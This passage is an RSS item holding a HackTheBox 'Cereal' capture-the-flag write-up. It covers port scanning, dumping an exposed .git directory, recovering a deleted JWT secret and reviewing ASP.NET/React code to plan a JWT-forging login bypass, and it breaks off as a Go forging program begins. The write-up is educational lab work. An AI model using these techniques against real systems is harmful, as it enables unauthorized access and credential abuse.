<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Deserialization on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/deserialization/</link>
    <description>Recent content in Deserialization on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 09 Jun 2021 07:33:40 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/deserialization/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Cereal</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
      <description>Skills Learned  Code review JWT authentication bypass XSS exploitation .NET deserialization Abusing Windows Access Tokens - SeImpersonate  Tools  Kali Linux 2019.4 (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux GenericPotato - https://github.com/micahvandeusen/GenericPotato  Reconnaissance Nmap All TCP ports scan with nmap discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.
→ root@kali «cereal» «10.10.14.3» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport-cereal 10.</description>
      <content:encoded><![CDATA[<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
<li>Abusing Windows Access Tokens - SeImpersonate</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>GenericPotato - <a href="https://github.com/micahvandeusen/GenericPotato">https://github.com/micahvandeusen/GenericPotato</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:45 EDT

....
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">127</span>
80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
443/tcp open  https   syn-ack ttl <span style="color:#ae81ff">127</span>

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 118.08 seconds
</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:51 EDT

....
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://cereal.htb/
|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Cereal
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Not valid before: 2020-11-11T19:57:18
|_Not valid after:  2040-11-11T20:07:19
|_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.34 seconds
</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ echo <span style="color:#e6db74">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form.</p>
<p><div class="img-container"><img src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  /></div>
</p>
<p>Tried a few common credentials but doesn&rsquo;t seem to work here.</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><div class="img-container"><img src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  /></div>
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  /></div>
</p>
<p>But l&rsquo;ll leave it for now.</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><div class="img-container"><img src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  /></div>
</p>
<p>Nothing I can do on this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://source.cereal.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              aspx,txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:52:32 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/.git/HEAD            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 23<span style="color:#f92672">]</span>
/Default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10090<span style="color:#f92672">]</span>
/aspnet_client        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 163<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span style="color:#f92672">]</span>
/default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9727<span style="color:#f92672">]</span>                                              
/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/uploads/<span style="color:#f92672">]</span>      
                                                                                              
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:54:41 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Accessing the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/ <span style="color:#f92672">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:25 GMT

HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:08:16 GMT
</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/HEAD
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Content-Length: <span style="color:#ae81ff">23</span>
Content-Type: text/plain
Last-Modified: Wed, <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">2020</span> 20:09:34 GMT
Accept-Ranges: bytes
ETag: <span style="color:#e6db74">&#34;adc1d19266b8d61:0&#34;</span>
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:29 GMT

→ root@kali «cereal» «10.10.14.3» 
$ curl -s -k http://source.cereal.htb/.git/HEAD
ref: refs/heads/master
</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ mkdir loot/source-cereal-git <span style="color:#f92672">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/ <span style="color:#f92672">[</span>403<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching common files
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.gitignore <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/description <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding refs/
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/config <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding packs
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Running git checkout .
</code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  /></div>
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code>  to compare the first commit with the security fixes which reveals a deleted JWT secret.</p>
<p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
</p>
<p>It looks like the security fixes includes prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my explanation (or at least how I understand it xD) with lines beginning with // &lt;== or  # &lt;== in the snippet code.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
$ tree -L <span style="color:#ae81ff">1</span> --dirsfirst
.
├── ClientApp
├── Controllers
├── Migrations
├── Models
├── Pages
├── Properties
├── Services
├── ApplicationOptions.cs
├── appsettings.Development.json
├── appsettings.json
├── CerealContext.cs
├── Cereal.csproj
├── DownloadHelper.cs
├── ExtensionMethods.cs
├── IPAddressHandler.cs
├── IPRequirement.cs
├── Program.cs
└── Startup.cs
</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Program.cs
 |
 v
Startup.cs  -&gt; Loads appsettings.json
 |
 v
React client
</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following informations:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are  two rules that looks like limiting requests to <code>/requests</code> endpoint, but it&rsquo;ll reset after certain period.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
<span style="color:#960050;background-color:#1e0010">....</span>
  <span style="color:#f92672">&#34;AllowedHosts&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
  <span style="color:#f92672">&#34;ApplicationOptions&#34;</span>: {
    <span style="color:#f92672">&#34;Whitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ]
  },
  <span style="color:#f92672">&#34;IpRateLimiting&#34;</span>: {
    <span style="color:#f92672">&#34;EnableEndpointRateLimiting&#34;</span>: <span style="color:#66d9ef">true</span>,
    <span style="color:#f92672">&#34;StackBlockedRequests&#34;</span>: <span style="color:#66d9ef">false</span>,
    <span style="color:#f92672">&#34;RealIpHeader&#34;</span>: <span style="color:#e6db74">&#34;X-Real-IP&#34;</span>,
    <span style="color:#f92672">&#34;ClientIdHeader&#34;</span>: <span style="color:#e6db74">&#34;X-ClientId&#34;</span>,
    <span style="color:#f92672">&#34;HttpStatusCode&#34;</span>: <span style="color:#ae81ff">429</span>,
    <span style="color:#f92672">&#34;IpWhitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ],
    <span style="color:#f92672">&#34;EndpointWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;ClientWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;GeneralRules&#34;</span>: [
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;post:/requests&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">2</span>
      },
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">150</span>
      }
    ]
  }
}

</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>The app initialization starts with <code>Startup.cs</code>, scrolling through the file source code, I could see there is a potential authentication bypass.</p>
<p>On the following snippet code, the app uses JWT for authentication but there is no validation on the issuer and the audience (<a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can cause security issue</a>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">....
            <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
            services.AddAuthentication(x =&gt;
            {
                x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
                x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
            })
            .AddJwtBearer(x =&gt;
            {
                x.RequireHttpsMetadata = <span style="color:#66d9ef">false</span>;
                x.SaveToken = <span style="color:#66d9ef">true</span>;
                x.TokenValidationParameters = <span style="color:#66d9ef">new</span> TokenValidationParameters
                {
                    ValidateIssuerSigningKey = <span style="color:#66d9ef">true</span>,
                    IssuerSigningKey = <span style="color:#66d9ef">new</span> SymmetricSecurityKey(key),
                    ValidateIssuer = <span style="color:#66d9ef">false</span>, <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>                    ValidateAudience = <span style="color:#66d9ef">false</span> <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>                };
            });
....
</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"> <span style="color:#66d9ef">public</span> User Authenticate(<span style="color:#66d9ef">string</span> username, <span style="color:#66d9ef">string</span> password)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">var</span> user = db.Users.Where(x =&gt; x.Username == username &amp;&amp; x.Password == password).SingleOrDefault();

                <span style="color:#75715e">// return null if user not found
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (user == <span style="color:#66d9ef">null</span>)
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;

                <span style="color:#75715e">// authentication successful so generate jwt token
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">var</span> tokenHandler = <span style="color:#66d9ef">new</span> JwtSecurityTokenHandler();
                <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
                <span style="color:#66d9ef">var</span> tokenDescriptor = <span style="color:#66d9ef">new</span> SecurityTokenDescriptor
                {
                    Subject = <span style="color:#66d9ef">new</span> ClaimsIdentity(<span style="color:#66d9ef">new</span> Claim[]
                    {
                        <span style="color:#66d9ef">new</span> Claim(ClaimTypes.Name, user.UserId.ToString())
                    }),
                    Expires = DateTime.UtcNow.AddDays(<span style="color:#ae81ff">7</span>),
                    SigningCredentials = <span style="color:#66d9ef">new</span> SigningCredentials(<span style="color:#66d9ef">new</span> SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
                };
                <span style="color:#66d9ef">var</span> token = tokenHandler.CreateToken(tokenDescriptor);
                user.Token = tokenHandler.WriteToken(token);

                <span style="color:#66d9ef">return</span> user.WithoutPassword();
            }
</code></pre></div><p>When the user is trying to authenticate, the code snippet above checks if the user credentials match with the one in database. If the credentials is match, the app will generate a JWT token for that user.  The token contains at least the user&rsquo;s ID and expiration time (7 days).</p>
<p>The user model is defined in here <code>Models/User.cs</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">....
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
    {
<span style="color:#a6e22e">        [Key]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> UserId { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Username { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Password { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Token { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
    }
....
</code></pre></div><p>In <code>ClientApp/src/LoginPage/LoginPage.jsx</code> , the authentication process doesn&rsquo;t need the server validation since it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">....
<span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">authenticationService</span> } <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;../_services&#39;</span>; <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LoginPage</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">Component</span> {
    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">props</span>) {
        <span style="color:#66d9ef">super</span>(<span style="color:#a6e22e">props</span>);

        <span style="color:#75715e">// redirect to home if already logged in
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">authenticationService</span>.<span style="color:#a6e22e">currentUserValue</span>) {  <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;/&#39;</span>); 
        }
    }

    <span style="color:#a6e22e">render</span>() {
        <span style="color:#66d9ef">return</span> (
            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Login</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h2&gt;</span>
....
</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">currentUserSubject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BehaviorSubject</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;currentUser&#39;</span>))); <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">authenticationService</span> <span style="color:#f92672">=</span> {
    <span style="color:#a6e22e">login</span>,
    <span style="color:#a6e22e">logout</span>,
    <span style="color:#a6e22e">currentUser</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">asObservable</span>(),<span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">currentUserValue</span> () { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">value</span> } <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>};
</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<h4 id="tactics">Tactics</h4>
<p>Here is the tactics to bypass the login page:</p>
<ul>
<li>Since I there is no validation on the issuer, and I have the JWT secrets, I could forge my own JWT to authenticate myself from browser&rsquo;s local storage.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang lol.</p>
<p>Here is the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;encoding/json&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
	<span style="color:#e6db74">&#34;time&#34;</span>

	<span style="color:#e6db74">&#34;github.com/dgrijalva/jwt-go&#34;</span>
)

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">UserService</span> <span style="color:#66d9ef">interface</span> {
